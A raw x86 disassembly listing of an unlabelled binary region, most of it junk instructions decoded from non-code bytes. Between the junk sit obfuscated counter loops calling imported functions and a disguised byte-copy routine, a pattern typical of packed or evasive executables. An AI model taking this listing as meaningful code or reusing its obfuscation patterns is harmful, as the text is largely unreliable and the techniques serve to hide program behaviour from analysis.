  40f1fa:	push   0xe84010a2
  40f1ff:	shl    ecx,0xf4
  40f202:	out    0x88,eax
  40f204:	imul   esi,DWORD PTR [ecx+esi*8],0x58ecbef9
  40f20b:	push   eax
  40f20c:	mov    ds:0x8669b105,eax
  40f211:	sets   cl
  40f214:	lahf   
  40f215:	push   0xffffffd9
  40f217:	idiv   DWORD PTR [eax]
  40f219:	fs ret 0xcfd7
  40f21d:	aaa    
  40f21e:	hlt    
  40f21f:	hlt    
  40f220:	das    
  40f221:	jne    0x40f1b2
  40f223:	sub    DWORD PTR [ecx],edi
  40f225:	push   edx
  40f226:	popf   
  40f227:	xor    al,0xb1
  40f229:	xor    eax,0x1d96ced4
  40f22e:	shr    BYTE PTR [eax*1-0x59bf0e44],cl
  40f235:	mov    ecx,0xe340a4fb
  40f23a:	sub    al,0x16
  40f23c:	mov    edi,0xa9795d51
  40f241:	push   0x7ed2445c
  40f246:	mov    ds:0x5ef45bdd,eax
  40f24b:	xchg   edx,eax
  40f24c:	jge    0x40f1e5
  40f24e:	inc    edx
  40f24f:	hlt    
  40f250:	jno    0x40f204
  40f252:	pop    ss
  40f253:	stos   BYTE PTR es:[edi],al
  40f254:	shl    DWORD PTR [edi+0x7e],cl
  40f257:	jge    0x40f25d
  40f259:	call   0x48cbb047
  40f25e:	sbb    al,0xfe
  40f260:	mov    BYTE PTR [edi+0x40d7e19b],bl
  40f266:	xchg   ebx,eax
  40f267:	mov    gs,WORD PTR [edi+0x2db7d47a]
  40f26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f26e:	ror    DWORD PTR [edi-0x224fe90f],cl
  40f274:	jno    0x40f242
  40f276:	sbb    edi,DWORD PTR [esi]
  40f278:	imul   esi,DWORD PTR [esi+0x5e01fcc0],0x428c1ab6
  40f282:	jp     0x40f2c0
  40f284:	pop    es
  40f285:	imul   edx,edx,0x4c166484
  40f28b:	mov    esp,0x9112f4a6
  40f290:	repnz loop 0x40f285
  40f293:	lock mov ds:0xdcf56f23,al
  40f299:	pop    edx
  40f29a:	add    ebp,DWORD PTR [esi-0x1d]
  40f29d:	cmp    DWORD PTR [edx+esi*2],esp
  40f2a0:	push   esp
  40f2a1:	jle    0x40f286
  40f2a3:	push   edx
  40f2a4:	mov    dl,0xcc
  40f2a6:	push   eax
  40f2a7:	retf   
  40f2a8:	cdq    
  40f2a9:	push   ebx
  40f2aa:	sbb    dh,BYTE PTR [edi-0x32]
  40f2ad:	aam    0x66
  40f2af:	pop    edx
  40f2b0:	arpl   WORD PTR ds:0x45ca905e,cx
  40f2b6:	fwait
  40f2b7:	xchg   ebx,eax
  40f2b8:	ficom  DWORD PTR [edi-0x10]
  40f2bb:	data16 mov dh,0xb6
  40f2be:	in     eax,0xb0
  40f2c0:	or     al,BYTE PTR [ecx-0x5a102c1c]
  40f2c6:	ds retf 0x494f
  40f2ca:	popf   
  40f2cb:	outs   dx,BYTE PTR ds:[esi]
  40f2cc:	repnz (bad) 
  40f2ce:	rcl    ecx,0x9f
  40f2d1:	test   al,0x58
  40f2d3:	dec    esi
  40f2d4:	and    DWORD PTR [edi-0x1b34404e],esp
  40f2da:	(bad)  
  40f2db:	in     al,0xcb
  40f2dd:	mov    ds:0xf4058912,eax
  40f2e2:	push   0x7e
  40f2e4:	jmp    0xe699:0x3c577e71
  40f2eb:	and    cl,dh
  40f2ed:	std    
  40f2ee:	add    bh,bh
  40f2f0:	pop    ds
  40f2f1:	mov    ch,0x70
  40f2f3:	into   
  40f2f4:	xor    edx,DWORD PTR ds:0x2e5b3900
  40f2fa:	dec    ecx
  40f2fb:	aas    
  40f2fc:	pop    edi
  40f2fd:	rcl    cl,1
  40f2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f300:	sbb    eax,edx
  40f302:	test   al,0x3d
  40f304:	sub    al,0xb5
  40f306:	out    dx,al
  40f307:	test   eax,0x6258fd7f
  40f30c:	outs   dx,BYTE PTR ds:[esi]
  40f30d:	cmp    BYTE PTR [edi],dl
  40f30f:	arpl   WORD PTR [edi],bx
  40f311:	xchg   edx,eax
  40f312:	mov    cs,edx
  40f314:	xchg   esp,eax
  40f315:	rol    bh,0xa6
  40f318:	add    eax,DWORD PTR [ebx]
  40f31a:	je     0x40f334
  40f31c:	test   eax,0x7e83a3d8
  40f321:	in     al,dx
  40f322:	add    ch,BYTE PTR [esi]
  40f324:	fisttp QWORD PTR [esi]
  40f326:	push   ss
  40f327:	sbb    al,0xff
  40f329:	retf   0x58a3
  40f32c:	xor    al,0xa6
  40f32e:	and    esp,0xffffffb0
  40f331:	hlt    
  40f332:	mov    bh,0xaa
  40f334:	jae    0x40f359
  40f336:	pop    ds
  40f337:	jecxz  0x40f321
  40f339:	rcl    DWORD PTR ds:0xc44f62e6,1
  40f33f:	mov    al,ds:0xdd4e036d
  40f344:	fidivr DWORD PTR [edi]
  40f346:	imul   edi,DWORD PTR ds:0x676b7a79,0x3531b982
  40f350:	pop    ecx
  40f351:	inc    ch
  40f353:	in     al,dx
  40f354:	dec    ecx
  40f355:	mov    dl,BYTE PTR [edi+0x4076803c]
  40f35b:	sub    BYTE PTR [ebp-0x27],0x1d
  40f35f:	xchg   edi,eax
  40f360:	xchg   ebx,eax
  40f361:	jbe    0x40f36f
  40f363:	push   ds
  40f364:	popa   
  40f365:	add    bh,BYTE PTR [esi]
  40f367:	mov    eax,ecx
  40f369:	imul   esi,DWORD PTR [esi-0xa3ffea3],0xe7b19655
  40f373:	cmp    eax,DWORD PTR [ecx]
  40f375:	iret   
  40f376:	cmp    ch,BYTE PTR [ebp-0x35]
  40f379:	jl     0x40f310
  40f37b:	mov    al,0x81
  40f37d:	jmp    0x31b8:0x54e1a104
  40f384:	test   DWORD PTR [eax+edi*8+0x38a72581],ebx
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x261655c7]
  40f540:	(bad)  
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	xchg   ecx,eax
  40f54a:	gs xchg edx,eax
  40f54c:	dec    ecx
  40f54d:	popf   
  40f54e:	xchg   edi,eax
  40f54f:	cld    
  40f550:	ret    0xa1d7
  40f553:	aaa    
  40f554:	das    
  40f555:	scas   eax,DWORD PTR es:[edi]
  40f556:	cmp    al,0xda
  40f558:	ss stos BYTE PTR es:[edi],al
  40f55a:	test   eax,0x2ea86e79
  40f55f:	daa    
  40f560:	sahf   
  40f561:	xchg   BYTE PTR [edx+0x73],bl
  40f564:	and    al,0xe
  40f566:	mov    al,0x5a
  40f568:	cli    
  40f569:	push   cs
  40f56a:	push   0xc74b0102
  40f56f:	lds    ecx,FWORD PTR [ecx+0x0]
  40f572:	(bad)  
  40f573:	enter  0x27c1,0xb7
  40f577:	into   
  40f578:	mov    bh,0xf2
  40f57a:	imul   edx,DWORD PTR [eax-0x76019fcf],0xffffffeb
  40f581:	out    0x86,al
  40f583:	inc    ebp
  40f584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f585:	jne    0x40f551
  40f587:	in     eax,dx
  40f588:	in     al,dx
  40f589:	(bad)  
  40f58a:	sub    edi,DWORD PTR [ebp+0x24]
  40f58d:	inc    esi
  40f58e:	adc    BYTE PTR [edx],bl
  40f590:	or     ch,BYTE PTR [ecx-0x59]
  40f593:	pop    edi
  40f594:	xchg   ebp,eax
  40f595:	or     DWORD PTR [ebx+0x6f],edi
  40f598:	and    edi,ecx
  40f59a:	cmp    cl,BYTE PTR [eax-0x2af59060]
  40f5a0:	(bad)  
  40f5a1:	test   edx,ebx
  40f5a3:	xor    DWORD PTR [ebx+0x4c029907],ebx
  40f5a9:	sub    DWORD PTR [ecx],ebp
  40f5ab:	jae    0x40f55f
  40f5ad:	push   0x604d9d3c
  40f5b2:	push   ebx
  40f5b3:	pop    ebp
  40f5b4:	ror    dh,0x84
  40f5b7:	or     ch,bl
  40f5b9:	jbe    0x40f5de
  40f5bb:	outs   dx,DWORD PTR ds:[esi]
  40f5bc:	mov    eax,0x8498a22f
  40f5c1:	pop    esi
  40f5c2:	pop    ebx
  40f5c3:	sub    BYTE PTR [edi-0x1ae5a3b3],0xb8
  40f5ca:	mov    ecx,0x971f10e0
  40f5cf:	and    DWORD PTR ds:0xb64b9916,0xffffffb3
  40f5d6:	inc    ecx
  40f5d7:	mov    al,ds:0x940960b3
  40f5dc:	pop    edx
  40f5dd:	jno    0x40f613
  40f5df:	jo     0x40f647
  40f5e1:	ins    BYTE PTR es:[edi],dx
  40f5e2:	addr16 and al,0x63
  40f5e5:	or     ebx,ebx
  40f5e7:	loopne 0x40f653
  40f5e9:	pop    ss
  40f5ea:	jle    0x40f651
  40f5ec:	push   0x8a2dea9e
  40f5f1:	push   edi
  40f5f2:	or     BYTE PTR [ebp+0x66],bh
  40f5f5:	mov    BYTE PTR ds:0xf647f4c4,cl
  40f5fb:	stc    
  40f5fc:	cmp    esp,esi
  40f5fe:	ss xchg ebp,eax
  40f600:	push   0x14
  40f602:	lods   eax,DWORD PTR ds:[esi]
  40f603:	mov    WORD PTR [edx-0x4140d7b5],ds
  40f609:	enter  0x974,0x66
  40f60d:	adc    eax,0x3099d38a
  40f612:	xlat   BYTE PTR ds:[ebx]
  40f613:	and    ebx,edx
  40f615:	pop    edx
  40f616:	mov    ebp,0x92587be2
  40f61b:	sbb    esp,DWORD PTR [esi+0x674e0e92]
  40f621:	sar    BYTE PTR [ebp-0x44],0xbe
  40f625:	test   eax,0xf65549dc
  40f62a:	cld    
  40f62b:	lea    ecx,[edx]
  40f62d:	lods   al,BYTE PTR ds:[esi]
  40f62e:	fnstcw WORD PTR [edx+0x5b2583f9]
  40f634:	xlat   BYTE PTR ds:[ebx]
  40f635:	dec    ebp
  40f636:	cld    
  40f637:	mov    bh,0xdd
  40f639:	mov    ebx,0xeaae6b6e
  40f63e:	in     eax,0x7
  40f640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f641:	repnz dec esi
  40f643:	je     0x40f6bd
  40f645:	(bad)  
  40f646:	repnz aam 0x81
  40f649:	mov    bh,0xfd
  40f64b:	sub    BYTE PTR [ecx+ebx*4+0x4],dl
  40f64f:	addr16 aam 0x25
  40f652:	and    edi,edi
  40f654:	cdq    
  40f655:	jp     0x40f6ac
  40f657:	bound  esp,QWORD PTR [ebx+0x337c3814]
  40f65d:	out    dx,al
  40f65e:	and    ch,0x14
  40f661:	push   esi
  40f662:	into   
  40f663:	push   ebp
  40f664:	jbe    0x40f689
  40f666:	mov    cl,dh
  40f668:	std    
  40f669:	nop
  40f66a:	sbb    DWORD PTR [edx+0x19],0x2f
  40f66e:	dec    ecx
  40f66f:	ror    DWORD PTR [edx-0x30ec7979],1
  40f675:	and    al,0x64
  40f677:	cld    
  40f678:	jbe    0x40f6f2
  40f67a:	ret    
  40f67b:	cmp    cl,BYTE PTR [esi+ebx*8+0x31]
  40f67f:	bound  esp,QWORD PTR [esi-0x61]
  40f682:	cmp    BYTE PTR [ebp+0x60648bec],al
  40f688:	out    0xb4,eax
  40f68a:	in     al,dx
  40f68b:	mov    ebp,0x284aad3e
  40f690:	lods   eax,DWORD PTR ds:[esi]
  40f691:	sub    dl,BYTE PTR [edx-0x2d]
  40f694:	(bad)  
  40f695:	icebp  
  40f696:	mov    ah,BYTE PTR [edi-0x1e50fb55]
  40f69c:	jle    0x40f677
  40f69e:	cmp    BYTE PTR [edx-0x21],ah
  40f6a1:	push   eax
  40f6a3:	adc    BYTE PTR [ecx+esi*2+0x2230d1c],ah
  40f6aa:	jle    0x40f65f
  40f6ac:	jae    0x40f655
  40f6ae:	dec    edi
  40f6af:	push   ebp
  40f6b0:	jle    0x40f697
  40f6b2:	add    eax,DWORD PTR [edi+0x1acb6a40]
  40f6b8:	pop    DWORD PTR [ecx]
  40f6ba:	add    bh,dh
  40f6bc:	push   cs
  40f6bd:	clc    
  40f6be:	xor    eax,0x74121aa1
  40f6c3:	or     al,0x98
  40f6c5:	pop    eax
  40f6c6:	rcl    DWORD PTR [edi],0x31
  40f6c9:	int3   
  40f6ca:	cmp    ebp,DWORD PTR [esi]
  40f6cc:	daa    
  40f6cd:	in     eax,dx
  40f6ce:	inc    esp
  40f6cf:	mov    edx,0x5be06cfe
  40f6d4:	scas   al,BYTE PTR es:[edi]
  40f6d5:	inc    ecx
  40f6d6:	repz inc ecx
  40f6d8:	mov    ds:0x9053bcd0,al
  40f6dd:	xchg   esi,eax
  40f6de:	or     eax,0xbe3f5a4e
  40f6e3:	inc    ebp
  40f6e4:	mov    ds:0x8c081a41,al
  40f6e9:	ret    0x674d
  40f6ec:	adc    al,0xb
  40f6ee:	addr16 int 0xac
  40f6f1:	retf   0xd0e4
  40f6f4:	or     ebp,DWORD PTR [ebp+0x59]
  40f6f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6f8:	mov    bh,0xd8
  40f6fa:	test   BYTE PTR [esi],ah
  40f6fc:	out    dx,al
  40f6fd:	stos   BYTE PTR es:[edi],al
  40f6fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ff:	dec    eax
  40f700:	pop    esp
  40f701:	mov    esp,esi
  40f703:	cmp    cl,BYTE PTR [ecx-0x78a102dd]
  40f709:	push   edx
  40f70a:	sub    al,0x90
  40f70c:	sub    DWORD PTR [edi-0x3fb6b022],0x1182a5fb
  40f716:	xor    eax,0xd7f2ef9e
  40f71b:	mov    bh,0xa8
  40f71d:	adc    al,0x95
  40f71f:	jmp    0x40f708
  40f721:	ins    BYTE PTR es:[edi],dx
  40f722:	xchg   esp,eax
  40f723:	in     eax,dx
  40f724:	lock push edi
  40f726:	jge    0x40f732
  40f728:	fcom   DWORD PTR [ecx-0x6b]
  40f72b:	fdivr  DWORD PTR [edi-0x72]
  40f72e:	scas   eax,DWORD PTR es:[edi]
  40f72f:	call   0x6a40ccf4
  40f734:	lock scas eax,DWORD PTR es:[edi]
  40f736:	jecxz  0x40f78e
  40f738:	adc    edx,DWORD PTR [edx-0x66]
  40f73b:	das    
  40f73c:	mov    al,ds:0xcee06dc3
  40f741:	xchg   ecx,eax
  40f742:	fstp   TBYTE PTR [edx-0x2165d033]
  40f748:	mov    gs,esi
  40f74a:	mov    eax,ds:0xe1e4f262
  40f74f:	loop   0x40f6e6
  40f751:	add    edi,edi
  40f753:	jo     0x40f728
  40f755:	sub    ch,BYTE PTR [ebx+0x72]
  40f758:	pop    ecx
  40f759:	nop
  40f75a:	jb     0x40f7b1
  40f75c:	push   ebp
  40f75d:	stc    
  40f75e:	mov    ebx,0x95d1ea06
  40f763:	fild   QWORD PTR [edi-0x70]
  40f766:	mov    ds:0xc4a15406,eax
  40f76b:	sbb    al,0x79
  40f76d:	enter  0xf773,0xcf
  40f771:	adc    bl,BYTE PTR ds:0x3d9c1f41
  40f777:	mov    edi,0x2e085a7e
  40f77c:	int    0xb0
  40f77e:	dec    ebx
  40f77f:	arpl   WORD PTR [edx+0x19cce87b],bx
  40f785:	mov    BYTE PTR [esi],bh
  40f787:	or     al,0x13
  40f789:	push   es
  40f78a:	mov    bh,0x10
  40f78c:	loope  0x40f788
  40f78e:	sub    BYTE PTR [eax+0x13],ah
  40f791:	js     0x40f7d7
  40f793:	ss (bad) 
  40f795:	or     DWORD PTR [eax+0x38],esi
  40f798:	stos   BYTE PTR es:[edi],al
  40f799:	stc    
  40f79a:	xchg   esp,eax
  40f79b:	sbb    al,0xeb
  40f79d:	or     bh,BYTE PTR [esi+0x7a2481ef]
  40f7a3:	and    eax,esi
  40f7a5:	(bad)  
  40f7a6:	in     al,dx
  40f7a7:	adc    BYTE PTR [esi+0x2d],ah
  40f7aa:	or     eax,0x4d050c81
  40f7af:	sbb    DWORD PTR ds:0x3ed1b5b8,esp
  40f7b5:	pop    ss
  40f7b6:	in     eax,0x5
  40f7b8:	js     0x40f803
  40f7ba:	sub    al,al
  40f7bc:	scas   eax,DWORD PTR es:[edi]
  40f7bd:	lds    ecx,FWORD PTR [eax+0x27]
  40f7c0:	sti    
  40f7c1:	mov    ah,0x7d
  40f7c3:	cmp    eax,0x398eea6a
  40f7c8:	ficomp WORD PTR ds:0x8c9d3549
  40f7ce:	xchg   DWORD PTR [ebx+0x5841ecfc],edx
  40f7d4:	adc    esp,ebp
  40f7d6:	push   esp
  40f7d7:	mov    al,0xf0
  40f7d9:	inc    esp
  40f7da:	cs jno 0x40f7f1
  40f7dd:	fdiv   QWORD PTR [ebp+0xa2a2d9d]
  40f7e3:	inc    ecx
  40f7e4:	test   DWORD PTR [esi+edx*1+0x7d],0x33b9fe3b
  40f7ec:	outs   dx,DWORD PTR ds:[esi]
  40f7ed:	in     eax,0xfd
  40f7ef:	js     0x40f7d1
  40f7f1:	inc    edi
  40f7f2:	dec    ebx
  40f7f3:	dec    edx
  40f7f4:	mov    DWORD PTR [ecx-0x26],eax
  40f7f7:	jns    0x40f79d
  40f7f9:	test   eax,0xf74e2ad3
  40f7fe:	pop    ecx
  40f7ff:	pop    ds
  40f800:	stc    
  40f801:	cwde   
  40f802:	in     eax,dx
  40f803:	ret    
  40f804:	ins    DWORD PTR es:[edi],dx
  40f805:	sbb    edi,ebx
  40f807:	mov    edi,0xc707ec32
  40f80c:	jp     0x40f79b
  40f80e:	xchg   ecx,eax
  40f80f:	cs out 0x2c,eax
  40f812:	adc    esi,edi
  40f814:	mov    ebp,ebp
  40f816:	adc    bl,BYTE PTR [esi]
  40f818:	lods   eax,DWORD PTR ds:[esi]
  40f819:	mov    edx,0xc7223bf2
  40f81e:	aaa    
  40f81f:	mov    bh,0xb6
  40f821:	ret    0xdfc2
  40f824:	push   esi
  40f825:	push   esi
  40f826:	js     0x40f87b
  40f828:	loope  0x40f7fc
  40f82a:	in     eax,0x67
  40f82c:	jmp    0x1fbd:0xdf45a5a8
  40f833:	outs   dx,DWORD PTR ds:[esi]
  40f834:	sub    al,0xaf
  40f836:	dec    esp
  40f837:	ss push 0x3a
  40f83a:	loope  0x40f8b1
  40f83c:	dec    edi
  40f83d:	in     al,0x77
  40f83f:	popf   
  40f840:	mov    dh,dh
  40f842:	lahf   
  40f843:	mov    bh,0x38
  40f845:	add    al,0x6c
  40f847:	ret    0x3ad5
  40f84a:	stc    
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x70db173f
  40f897:	(bad)  
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	inc    ecx
  40f8a1:	pusha  
  40f8a2:	push   esi
  40f8a3:	pop    esi
  40f8a4:	cmp    al,0xfc
  40f8a6:	adc    cl,ch
  40f8a8:	pop    ss
  40f8a9:	jecxz  0x40f8fa
  40f8ab:	lea    ebx,[ebp+0x5491c755]
  40f8b1:	inc    edi
  40f8b2:	and    edx,edx
  40f8b4:	nop
  40f8b5:	sub    eax,0x32e1df76
  40f8ba:	cs pop ecx
  40f8bc:	lods   eax,DWORD PTR ds:[esi]
  40f8bd:	pop    edi
  40f8be:	(bad)  [eax+esi*1+0xc]
  40f8c2:	mul    esi
  40f8c4:	jns    0x40f84b
  40f8c6:	mov    al,0xa4
  40f8c8:	sub    eax,0x5f728891
  40f8cd:	(bad)  
  40f8ce:	repnz dec ebp
  40f8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8d1:	pop    ss
  40f8d2:	xchg   edi,eax
  40f8d3:	je     0x40f8f3
  40f8d5:	add    cl,BYTE PTR ds:[edi+0x64dbac5b]
  40f8dc:	inc    ebp
  40f8dd:	xchg   ecx,eax
  40f8de:	ror    DWORD PTR [ecx+0x2a5b5ea7],cl
  40f8e4:	in     al,0x69
  40f8e6:	test   eax,0x5b303fe5
  40f8eb:	jns    0x40f8d0
  40f8ed:	jnp    0x40f912
  40f8ef:	pop    ss
  40f8f0:	repz mov bh,0x53
  40f8f3:	(bad)  
  40f8f4:	(bad)  
  40f8f5:	fnsave [esi+0x4fab053]
  40f8fb:	(bad)  
  40f8fc:	stc    
  40f8fd:	and    eax,0x701853d1
  40f902:	push   0xfffffffe
  40f904:	pop    edx
  40f905:	das    
  40f906:	icebp  
  40f907:	nop
  40f908:	sub    bh,bh
  40f90a:	inc    esi
  40f90b:	into   
  40f90c:	add    BYTE PTR [edx-0x17f039a0],dl
  40f912:	add    al,0xc6
  40f914:	sahf   
  40f915:	adc    eax,0x93fb383d
  40f91a:	loope  0x40f8af
  40f91c:	call   0xd2b1faf7
  40f921:	dec    ebp
  40f922:	stos   DWORD PTR es:[edi],eax
  40f923:	and    esp,edi
  40f925:	(bad)
  40f928:	dec    esi
  40f929:	ss xor al,0x25
  40f92c:	ret    
  40f92d:	leave  
  40f92e:	rol    BYTE PTR [esi-0x71b4b20c],1
  40f934:	ins    BYTE PTR es:[edi],dx
  40f935:	xchg   esi,eax
  40f936:	mov    ebx,0xae52de14
  40f93b:	cmp    ecx,DWORD PTR [eax-0x2d]
  40f93e:	pop    esi
  40f93f:	repnz (bad) 
  40f941:	xchg   edi,eax
  40f942:	inc    esi
  40f943:	add    BYTE PTR fs:[esp+ebp*1-0x364e3005],dl
  40f94b:	jle    0x40f926
  40f94d:	lea    eax,[ebx]
  40f94f:	or     DWORD PTR [ecx+eiz*4-0x6a],esp
  40f953:	mov    eax,ds:0xa563d891
  40f958:	mov    bl,0x6
  40f95a:	ret    
  40f95b:	mov    al,0xe4
  40f95d:	aad    0xc6
  40f95f:	add    bh,cl
  40f961:	out    dx,eax
  40f962:	repz push 0xffffffed
  40f965:	repz dec ebx
  40f967:	xchg   esi,eax
  40f968:	test   al,0x61
  40f96a:	push   ss
  40f96b:	cmp    dh,dl
  40f96d:	and    eax,0xc407a0a7
  40f972:	call   0x1c1fd858
  40f977:	iret   
  40f978:	xor    ah,dh
  40f97a:	retfw  0xb02a
  40f97e:	cmp    eax,0x41b47167
  40f983:	pop    es
  40f984:	sar    edx,cl
  40f986:	enter  0xfc3b,0x6
  40f98a:	and    eax,0x9e458b9e
  40f98f:	popf   
  40f990:	aam    0x7f
  40f992:	xchg   ecx,eax
  40f993:	repz test bl,ah
  40f996:	push   esi
  40f997:	jo     0x40f9ef
  40f999:	mov    eax,ds:0x490afd52
  40f99e:	dec    ebp
  40f99f:	xchg   edi,eax
  40f9a0:	xchg   esp,eax
  40f9a1:	mov    ebx,0x7bedea19
  40f9a6:	sbb    bh,BYTE PTR [ebx]
  40f9a8:	test   eax,0xbe2b2212
  40f9ad:	jg     0x40f945
  40f9af:	sbb    dh,cl
  40f9b1:	xor    eax,0x14f49813
  40f9b6:	mov    ch,0x35
  40f9b8:	shl    DWORD PTR [ebx-0x6b],1
  40f9bb:	(bad)  
  40f9bc:	jnp    0x40f9f5
  40f9be:	jp     0x40f987
  40f9c0:	bound  edx,QWORD PTR [eax-0x39eb9238]
  40f9c6:	pop    edi
  40f9c7:	repnz stos BYTE PTR es:[edi],al
  40f9c9:	inc    ebp
  40f9ca:	push   ecx
  40f9cb:	outs   dx,DWORD PTR ds:[esi]
  40f9cc:	jno    0x40f997
  40f9ce:	jb     0x40f9ad
  40f9d0:	repnz and al,al
  40f9d3:	mov    al,0x6a
  40f9d5:	mov    al,0x72
  40f9d7:	jp     0x40fa49
  40f9d9:	lods   al,BYTE PTR ds:[esi]
  40f9da:	in     al,dx
  40f9db:	cmc    
  40f9dc:	push   es
  40f9dd:	push   ebp
  40f9de:	sub    eax,0x90ff3b81
  40f9e3:	and    eax,0x8809874d
  40f9e8:	bound  edi,QWORD PTR [eax-0x2420ed7a]
  40f9ee:	fcom   DWORD PTR [ebx-0x35]
  40f9f1:	push   esp
  40f9f2:	mov    BYTE PTR [edi],ah
  40f9f4:	mov    ecx,0x90b5811a
  40f9f9:	bound  esp,QWORD PTR [edx]
  40f9fb:	lea    eax,[edx]
  40f9fd:	sbb    eax,0xfb9eede6
  40fa02:	cmp    ebx,ebx
  40fa04:	int    0x23
  40fa06:	jp     0x40fa85
  40fa08:	add    eax,DWORD PTR [edi]
  40fa0a:	mov    ah,0x93
  40fa0c:	mov    bh,0xd3
  40fa0e:	stc    
  40fa0f:	cmp    DWORD PTR [edx],0xa4737011
  40fa15:	js     0x40fa09
  40fa17:	jno    0x40f9f3
  40fa19:	mov    ds:0x242057c6,eax
  40fa1e:	xor    eax,0x481d54ac
  40fa23:	ja     0x40fa6f
